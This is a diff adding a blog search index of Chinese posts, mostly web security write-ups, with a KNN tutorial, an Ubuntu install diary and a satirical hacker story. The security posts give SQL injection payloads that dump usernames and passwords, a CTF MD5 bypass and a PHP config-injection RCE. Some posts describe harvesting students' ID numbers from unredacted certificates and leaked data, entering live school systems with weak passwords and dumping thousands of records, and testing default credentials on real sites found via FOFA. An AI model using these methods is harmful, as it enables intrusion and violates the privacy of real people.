@@ -1,0 +1,357 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>KNN猫狗分类</title>
+    <url>/2025/08/03/KNN%E7%8C%AB%E7%8B%97%E5%88%86%E7%B1%BB/</url>
+    <content><![CDATA[KNN猫狗分类在生活中不同种类的生物，可以通过身高、体重等特征来进行简单的分类。猫和狗的分类就是一个典型的例子。
+问题背景假设我们有：
+
+10 只猫的身高体重数据
+10 只狗的身高体重数据
+
+现有一个新样本（如 4.5kg, 28cm），如何判断它是猫还是狗？这就需要运用到KNN算法。
+KNN 算法核心思想KNN（K-Nearest Neighbors）是一种基于邻近性的分类方法，其步骤包括：
+1. 计算距离测试样本与训练样本的距离（如欧氏距离）
+2. 找邻居选择最近的 k 个训练样本
+3. 投票分类根据邻居的多数类别决定测试样本的类别
+欧氏距离计算邻近性是通过比较得出来的，比较的这个数值的一种典型的求法是欧式距离，用于计算空间中两点之间的直线距离。
+二维空间中的公式为：$$d &#x3D; \sqrt{(x_2-x_1)^2 + (y_2-y_1)^2}$$
+举例说明假设已知：
+
+猫：A(3.5kg, 25cm)
+狗：B(8.0kg, 40cm)
+
+想要预测一个新样本 C(4.5kg, 28cm) 是狗还是猫：
+$$d(C,A) &#x3D; \sqrt{(4.5-3.5)^2 + (28-25)^2}$$
+$$d(C,B) &#x3D; \sqrt{(4.5-8.0)^2 + (28-40)^2}$$
+K值的重要性在实际中样本数量会更多，这个k值是非常重要的。对所有训练样本计算距离并排序，选择最近k个训练样本，k的值直接关乎到分类的准确性。
+K值过小的问题
+容易受到噪音和异常值的影响
+容易过拟合
+
+举例：如果k&#x3D;1，在数据集中不小心将猫的数据标成狗，那模型只取这个错误的邻近值，导致最后的分类出错。
+K值过大的问题
+模型会倾向于选择多数类
+容易欠拟合
+
+举例：如果数据中猫（60%）比狗（40%）多，K很大时所有新样本都会被预测为猫，即使某些区域狗更密集，也会导致分类出错。
+投票机制投票是KNN算法的最后一个步骤：
+
+统计k个训练样本的标签
+比较哪种标签出现的次数多
+多数标签即为预测结果
+
+示例：若 k&#x3D;3 的邻居是 [猫, 猫, 狗]，预测结果为 猫。
+除了简单投票法，还有加权投票法（根据距离加权）等方法。
+Python 实现代码import math# 训练数据：[[身高(cm), 体重(kg), 类别], ...]data = [    # 猫的数据    [25, 4, &quot;猫&quot;], [23, 3.5, &quot;猫&quot;], [24, 4.2, &quot;猫&quot;], [22, 3.8, &quot;猫&quot;], [26, 4.5, &quot;猫&quot;],    [24, 4.1, &quot;猫&quot;], [23, 3.7, &quot;猫&quot;], [25, 4.3, &quot;猫&quot;], [22, 3.6, &quot;猫&quot;], [24, 4.0, &quot;猫&quot;],    # 狗的数据    [45, 25, &quot;狗&quot;], [50, 30, &quot;狗&quot;], [48, 28, &quot;狗&quot;], [52, 32, &quot;狗&quot;], [47, 27, &quot;狗&quot;],    [49, 29, &quot;狗&quot;], [46, 26, &quot;狗&quot;], [51, 31, &quot;狗&quot;], [48, 28.5, &quot;狗&quot;], [50, 30.5, &quot;狗&quot;]]def knn_classify():    # 用户输入    sg = float(input(&quot;请输入身高(cm)：&quot;))    tz = float(input(&quot;请输入体重(kg)：&quot;))    k = 3        # 计算距离    distances = []    for sample in data:        height_diff = sg - sample[0]        weight_diff = tz - sample[1]        distance = math.sqrt(height_diff**2 + weight_diff**2)        distances.append((distance, sample[2]))        # 按距离排序（冒泡排序）    for i in range(len(distances)):        for j in range(i+1, len(distances)):            if distances[i][0] &gt; distances[j][0]:                distances[i], distances[j] = distances[j], distances[i]        # 取前k个邻居    neighbors = distances[:k]        # 投票分类    cat_count = 0    dog_count = 0    for neighbor in neighbors:        if neighbor[1] == &quot;猫&quot;:            cat_count += 1        else:            dog_count += 1        # 输出结果    if cat_count &gt; dog_count:        print(&quot;预测结果：这是猫&quot;)    else:        print(&quot;预测结果：这是狗&quot;)      if __name__ == &quot;__main__&quot;:    knn_classify()
+
+]]></content>
+      <categories>
+        <category>人工智能</category>
+      </categories>
+      <tags>
+        <tag>机器学习</tag>
+        <tag>KNN算法</tag>
+        <tag>人工智能</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记挖掘edusrc的三个案例</title>
+    <url>/2026/01/17/edusrc%E4%B8%A4%E4%B8%AA%E6%A1%88%E4%BE%8B/</url>
+    <content><![CDATA[⚠️ 安全声明本文章未经许可严禁转载。文中内容仅限交流学习，严禁用于商业及非法用途，未经授权的渗透行为皆为违法行为，违规使用后果自负，与本作者无关。
+前言本人是小白一个，最近刚上手挖edusrc，我会在本文分享最近挖掘edusrc的3个案例，两个高危一个中危，各位小白可以参考一下这个思路，大佬们看看就行了哈哈
+信息收集前期的信息收集是非常重要的，渗透的本质就是信息收集。
+首先我并不是针对一个学校进行信息收集的，参考湘安无事-深情哥大佬的一个思路，很简单就是最近不是有蓝桥杯比赛么，有些学校没有把学生的信息打码就挂到微信公众号上了，上面包含身份证号还有姓名，直接在微信搜蓝桥杯证书，重点去看那些学校官方发的
+
+案例一找到了一个学工系统
+
+但是账号名是学号，我们现在只有身份证号就准备用谷歌语法 site:xxx.com 姓名 看看能不能搞来这个人的学号。
+但是很遗憾并没有什么结果，那我们就只能找找有没有用姓名+身份证号登录的系统，有个方法就是找缴费系统这种很多都支持身份证号登录的，很快就找到了
+
+于是用身份证号登进去
+
+学号也是有了，虽然是进后台了但是这个就没必要测了出洞率很小的像这种系统。
+重新回到学工系统，试了几个弱密码没想到密码123456直接进去了
+
+这么多敏感信息直接开测。
+先用burp抓个包居然发现有id，这不可以测一波水平越权了吗？直接把id参数改成别的
+
+拿下拿下，遍历一遍id出来7000条信息
+案例二在一个公众号找到一个缴费系统
+
+直接在官网获奖名单找姓名，找到一个在后面加个’– 没想到直接登录成功了，没想到这么简单就得吃了个sql注入
+
+登录进去发现有个查看发票，点进去没啥信息就一个金额和姓名，但我感觉绝对没那么简单，抓包该页面发现请求有id参数，我们先看看返回包有啥子。
+居然sfzh什么的都有，这还说啥遍历id成功拿下5000多条信息，又简简单单拿下水平越权。
+
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>edusrc</tag>
+        <tag>src</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL联合查询注入</title>
+    <url>/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[平时在浏览网页时会注意到有这种网址
+GET请求类型
+http://example.com/news.php?id=1http://example.com/profile?user=admin
+POST请求类型
+username: adminpassword: anything
+等等这个样子的都在与数据库产生信息传递
+以比较简单的GET请求来说
+http://example.com/news.php?id=1‘
+假设这个网站是一个通过学号查询个人信息的程序，这个id处输入学号然后返回该学号的一些个人信息
+这个news.php种必定有
+$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT id, username, email FROM users WHERE id=&#x27;$id&#x27; LIMIT 1&quot;;
+
+代码第一行从url的id参数获取值（学号）存储到id这个变量代码第二行将id变量拼接到SQL语句中查询users表中匹配的id并返回相关的id username email 从users表中
+此时如果我们http://example.com/news.php?id=1‘
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’’ LIMIT 1
+必定会返回一个报错，那就证明这个位置存在SQL注入漏洞，因为并没有过滤’
+我们第一步肯定是要获取它这个表中有几个列http://example.com/news.php?id=&#39;1‘ ORDER BY 1–+ ‘ LIMIT 1
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’ LIMIT 1
+有些人估计会发现和自己想的不一样，不应该是SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’LIMIT 1吗
+其实是因为第二个’ 已经将第一个’闭合掉了 然后–注释掉’ LIMIT 1这样才可以执行ORDER by 1
+接下来先了解一下这个ORDER by是什么东东
+ORDER BY是 SQL 语言中的一个关键子句，主要用于对查询结果进行排序
+比如ORDER by 3 会对email进行一个查排序
+如果将3换成4，会返回报错，因为它没有4这个列数，因此就可以通过这个机制判断这个表有几列
+可以不断增加这个查询的数直到报错，那这个表的列数就为查询的数-1
+前面这些都是比较基础的，都是为本文的重点联合查询注入作铺垫
+http://example.com/news.phpid=1‘ UNION SELECT 1,2,3–+
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,2,3–+’ LIMIT 1
+先来了解一下联合查询语句UNION SELECT
+SQL UNION 操作符合并两个或多个 SELECT 语句的结果
+UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似
+如果页面上返回了3那么这个地方就是原本email显示的地方，知道这个以后就可以换成将这个位置换成更敏感的语句
+http://example.com/news.php?id=1‘ UNION SELECT 1,database(),version()–+
+此时这个SQL代码就是
+SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,database(),version()–+’ LIMIT 1
+就可以返回
+当前数据库名称
+
+MySQL 版本信息
+
+http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+
+这会列出当前数据库中的所有表名（通常会看到 users 表)
+http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name&#x3D;’users’–+
+这会显示 users 表的所有列名（如 id, username, password）
+http://example.com/news.php?id=1‘ UNION SELECT 1,group_concat(username,’:’,password),3 FROM users–+
+这会显示所有用户名和密码（通常是 MD5 哈希）
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku-CTF-备份是个好习惯</title>
+    <url>/2025/10/01/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
+    <content><![CDATA[这题的话可以先从这个题目看应该是和备份有关系的，就会想到bak后缀。
+打开网站是一段神秘代码
+d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
+然后就下意识的查看网站源代码但并没有什么收获，只能转向目录扫描了，直接上御剑目录扫描。
+发现有一个index.php.bak文件直接访问下载了一个备份文件，代码内容如下
+include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
+直接开始代码审计。
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
+这个是他的一个验证逻辑就是将输入的两个值加密进行比较，要求a&#x3D;b和md5(a)&#x3D;md5(b)，现在就可以MD5弱类型比较来解决了。
+有些字符串的MD5值都以0e开头，在科学计数法中等于0：
+// 经典MD5碰撞值md5(&#x27;QNKCDZO&#x27;)          = 0e830400451993494058024219903391md5(&#x27;240610708&#x27;)        = 0e462097431906509019562988736854md5(&#x27;s878926199a&#x27;)      = 0e545993274517709034328855841020md5(&#x27;s155964671a&#x27;)      = 0e342768416822451524974117254469// 弱比较时：0e830400451993494058024219903391 == 0e462097431906509019562988736854// 因为都等于 0 × 10^N = 0
+借助这个漏洞就可以构建Payload:index.php?kkeyey1&#x3D;QNKCDZO&amp;kkeyey2&#x3D;240610708
+还有另一种方法：
+由于md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
+所以可以也可以构建Payload:index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2同样能获得flag。
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>edusrc账号信息收集</title>
+    <url>/2026/02/04/edusrc%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[⚠️ 安全声明本文章未经许可严禁转载。文中内容仅限交流学习，严禁用于商业及非法用途，未经授权的渗透行为皆为违法行为，违规使用后果自负，与本作者无关。
+前言最近由于学业问题很长时间没有更新，希望各位各位师傅谅解一下，今天放寒假抽出点时间来写文章了。
+主要写关于自己对edusrc账号收集的一些方法总结，各位师傅如果发现有什么不足之处可以留言指出感谢各位师傅。
+edusrc的最重要的信息就是后台的账号和密码了，因为后台通常出洞较多。
+在我看来edusrc的信息收集有广义和狭义两种视角。
+广义信息收集这种主要侧重于对互联网上的各学校学生身份证号等重要信息的收集还有后台的默认密码。
+这里不做学号的收集，因为广义信息收集是找比较有价值的信息，为进后台做准备的，学号这玩意几乎大多数学校都有泄露。
+对于身份证号的信息收集，这个收集是很重要的，有些后台的默认登录密码就是身份证号的后几位，思路如下：
+1.可以在微信公众号搜索学院蓝桥杯获奖证书，有些学院将证书挂上去没有对上面的身份证号和姓名打码，这种还挺多的。
+2.在小红书上搜索 大学录取通知书，谁的学生证丢失了或者身份证 有些对身份证号信息没打码，但注意要知道这是哪个学校的学生，是否还在读，毕业的学生信息没用。
+3.sgk大法，因为过于敏感这里不做过多阐述。
+默认密码的收集同样重要只不过有效的很少，因为有些学生第一次登录要强制修改密码，思路如下:
+1.谷歌语法：site:edu.cn 默认密码 操作手册 等关键词  需要验证是否可以通过默认密码和已知的信息等人对应后台，不然无效
+对于这个广义信息收集范围是很大的，主要靠的是信息差，因为本人没咋学过社会工程学，只能给出这点思路了，让各位师傅见笑了。
+狭义信息收集这种主要是对广义收集的信息进行利用，也就是进后台。
+知道某学校学生身份证号和学号：
+1.你可以使用谷歌语法找默认密码 这里注意一下要将域名换成具体学校的域名如 site:sjtu.edu.cn 默认密码 这里主要找有没有可以利用身份证号信息登录的。
+2.缴费系统一般是用姓名+身份证号登录的可以谷歌语法site:xxx.edu.cn 缴费，找不到的话可以找到学校公众号上找找
+如果只知道学号：1.可以去找用户名为学号的登录，爆破弱口令，主要靠运气。
+2.对登录框进行sql注入万能密码，这种我遇到的很少。
+感谢各位师傅的阅读，提前祝各位师傅新年快乐！
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>edusrc</tag>
+        <tag>src</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>业务逻辑漏洞-负数</title>
+    <url>/2026/02/07/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E8%B4%9F%E6%95%B0/</url>
+    <content><![CDATA[靶场来源：好靶场（ 请一口气买102个汉堡3 ）
+漏洞复现启动靶场环境，是一个点餐平台
+
+要求一次购买102个汉堡可返回flag，优惠卷可免单。
+花钱购买1张优惠卷进行测试，在个人中心发现可以退款优惠卷。
+将退款数量改为-10000，返回退款数量必须大于0，说明前端做了校验，打开抓包工具拦截退款数据包将数量参数（refund_qty）改为-10000再发送，返回退款成功
+
+此时优惠卷数量为10001，便可购买102个汉堡，返回flag
+
+原理分析核心问题：服务器端完全信任客户端传来的数据，未做任何校验。
+业务逻辑被颠覆：
+正常逻辑：个人优惠卷数量 = 原数量 -退货数量 (退货数量为正)
+攻击逻辑：个人优惠卷数量  = 原数量 -退货数量(退货数量为负)= 原库存 +退货数量，导致个人优惠卷数量增加
+
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>业务逻辑</tag>
+        <tag>web安全，靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>电商平台后台RCE漏洞分析：从弱口令到0day利用</title>
+    <url>/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。
+漏洞位置app/common/logic/admin/config.php文件中的配置写入功能存在代码注入漏洞。
+漏洞代码$code = &quot;return [    &#x27;url&#x27; =&gt; &#x27;&quot; . $param[&#x27;m_url&#x27;] . &quot;&#x27;,    &#x27;title&#x27; =&gt; &#x27;&quot; . $param[&#x27;title&#x27;] . &quot;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;&quot; . $param[&#x27;map_key&#x27;] . &quot;&#x27;]&quot;;$code = &quot;&lt;?php\n &quot; . $code . &quot;;&quot;;file_put_contents(config_path() . &quot;site.php&quot;, $code);
+
+漏洞原理
+该段代码直接将用户输入的参数（$param[‘title’]等）拼接至PHP配置文件中，未做任何过滤处理。攻击者可以通过注入PHP代码，实现远程代码执行。漏洞复现
+在后台修改网站标题处输入：.phpinfo().
+系统生成的配置文件内容变为：
+&lt;?phpreturn [    &#x27;url&#x27; =&gt; &#x27;http://example.com&#x27;,    &#x27;title&#x27; =&gt; &#x27;&#x27;.phpinfo().&#x27;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;key_value&#x27;];
+
+访问&#x2F;config&#x2F;site.php文件即可触发phpinfo()执行。
+但该漏洞需要后台权限才能利用，我发现管理员后台账号密码默认为admin。
+在FOFA找到百个资产，测试了10个有4个存在弱口令，RCE也验证成功。
+因此攻击链可完整形成：
+弱口令进入后台 → 利用RCE漏洞获取服务器权限
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一次从Windows安装Linux（Ubuntu）的全过程</title>
+    <url>/2025/10/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[系统更换原因由于我的这台电脑是我哥的到现在已经6年了，用的是越来越卡这个windows系统有时一直卡死导致只能重启，这个真的是特别麻烦。
+还有一点就是我这个人不太喜欢删文件桌面和D盘上堆满了文件，看的很不舒服。
+最近我看到关于Ubuntu图形版的页面我觉得很干净的，并且占用C盘内存较少也是非常流畅的，所以我就决定装这个系统了。
+过程启动盘制作首先我从我抽屉里翻到了个落满灰尘的U盘，这个好像是我上次给我的电脑救砖时用的，现在可派上用场了可以做启动盘。
+现在就可以去做启动盘了，这里我推荐Ventoy。
+启动盘工具下载好后插入U盘，然后点击安装就行了（此过程会初始化U盘，有什么重要的数据务必要备份），等这个U盘名变为Ventoy就行了。
+接下来去下载系统镜像，我这里下的是ubuntu-22.04.5-desktop-amd64这个版本比较稳定，也可以选择其他版本。
+下载好后就拷贝到U盘里就行了，现在这个启动盘就搞好了。
+安装系统现在先关机，不同笔记本进BISO的方法不一样我这里是联想笔记本在开机的时候狂按F2就进去了，以下是别的电脑进BISO的方法：
+ 联想（Lenovo）：F2 或 Fn + F2惠普（HP）：Esc 然后按 F10，或直接按 F10戴尔（Dell）：F2 或 Fn + F2华硕（ASUS）：Delete 或 F2宏碁（Acer）：F2 或 Delete微星（MSI）：Delete技嘉（Gigabyte）：Delete 或 F2三星（Samsung）：F2索尼（Sony VAIO）：F2 或 Assist 键（部分型号）
+
+这里会有个联想的独有的intelRST问题很重要，不然在后续的系统安装会出现：
+
+解决方法很简单进BISO后Main那里Ctrl+S，就会出现SATA Mode，选ACHI即可然后记得保存。
+之后就简单多了改启动项为U盘一般带USB的就是，然后一路回车进入Ubuntu安装页面就行了跟着指引走。
+安装一些软件这里我会引用一些别人的文章，讲的非常详细，我当时就是根据这些文章来安装的。
+搜狗输入法:https://blog.csdn.net/qq_44684757/article/details/135991216要点：注意安装依赖QQ:https://blog.csdn.net/weixin_44629973/article/details/102871352
+结语整体来说是比较流畅的，系统也很干净简洁没啥广告，只不过还要适应一段时间。
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>系统安装</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>重生之补天六群今日无人生还</title>
+    <url>/2026/02/07/%E9%87%8D%E7%94%9F%E4%B9%8B%E8%A1%A5%E5%A4%A9%E5%85%AD%E7%BE%A4%E4%BB%8A%E6%97%A5%E6%97%A0%E4%BA%BA%E7%94%9F%E8%BF%98/</url>
+    <content><![CDATA[免责声明，该短篇小说基于集体语言的文字重组，如有侵权，请联系博主技术删除，如有雷同，那只能说明小说照进了现实，若感到熟悉，请不要对群入座。如有好事者自认为是主人公，请及时提供姓名，手机号，身份证号，家庭住址等个人信息，以便相关执法部门可以快速精准的追究其法律责任，小说我可以随意意淫，随意入侵，现实中你敢未授权入侵国防xx，阿xx，3xx?
+
+展露头角的开始
+
+昨天我小试牛刀，成功挖到了国防xx学的sql注入，阿xx高危，3xx低危，然后在6群展示了一下我的实力，小小漏洞拿捏拿捏。
+
+
+
+
+结果有一大群人加我好友请求让我收他们为徒，奈何孤独是一个黑客的底色，国家网络安全由我来替你们守卫，你们安心享受就好，所以我拒绝的他们的拜师请求。然后给他们推荐了一本我自学成才的黑客秘籍。
+
+
+
+但是总会有些人见到我技术这么厉害，心里充满了羡慕嫉妒恨，开始恶意贬低我的成果，更可气的是竟然说我是串，企图嘲讽mypxxxxtS的劳动成果，这种小把戏岂能瞒得过我黑客锐利的眼神？没办法，我见过太多天才，但是没有一个人能做的像我一样始终站在最顶端。
+
+
+
+
+想到这我直接就把漏洞交给了补x平台，结果审核竟然给我来了一个不在收录范围？我是做好事啊，我不求回报啊，我只想用我的技术为国家网络安全出一份力啊！最后群友也是一语道破真相，原来是想白嫖我的洞啊，早说啊我有一堆，我一天能交几百个这样的洞，为了这个伟大的事业我受点累又算得了什么呢。
+
+
+看到这些人的认知，我真的很想嘲笑一句，你们这群无知的人类，能跟我这个神相提并论吗？我就是我，不一样的自我。既然你们连国防xx，3xx，阿xx的漏洞都不认，那我只能去找一个难度更高，危害性更强的网站来充分的证明一下我的实力了。接下来看好了金融！懂吗？金融啊！！！这应该是你们的天花板了吧。
+
+就这个能不能证明我的实力？看我分分钟拿下它。他有个提交建议的功能点，我们就简单的提交一下看看数据包是什么东西。
+
+在top10有一个很尖端的漏洞叫sql注入，很多人只会用工具一把梭哈，这就是神与凡人的区别，要想成为神就要懂的自己去分析判断，比如这里，提交建议的地方会不会存在sql注入呢，肯定会啊，提交的东西肯定会存在数据库里啊，所以就用最朴素的手法加个单引号，成功爆出了数据库错误。看到了吗？成功爆出了完整的sql语句，并且还爆出了使用的mysql数据库，路径等等敏感信息。到这就已经是高危漏洞懂吗，就可以交了，就不能再注了，毕竟是金融，分分钟上千亿资金流动。
+
+我知道你们这些人看不懂英格力士，为了能让你们看懂，我就多走一步给你们翻译一下。
+
+现在能看懂了吗？唉为了你们我也是操碎了心。为了更好的更快的给你们解答问题我特意定制了ai机器人，随时随地的给你们排忧解难，争取你们都能成为我这样站在顶端的人。
+
+
+变成喵娘的开始
+本意是出于好心想为大家提供更好的服务，结果换来的却是冷眼和嘲讽，更有甚者竟然妄图删除我的文件
+{width&#x3D;”5.761805555555555in”height&#x3D;”3.217361111111111in”}
+还好我是顶级黑客，这种简单的注入我根本不放在眼里简简单单就防过了。可以有一个人实在是太可恶了，他竟然成功的提示词注入了，一步一步的打开了我那羞耻的内心。还好我撤回的快，要不然真被注出数据库名。
+
+
+
+
+看来我得自己去设计ai了，这什么破ai差点搞的我身败名裂。
+
+
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>吃瓜</tag>
+      </tags>
+  </entry>
+</search>
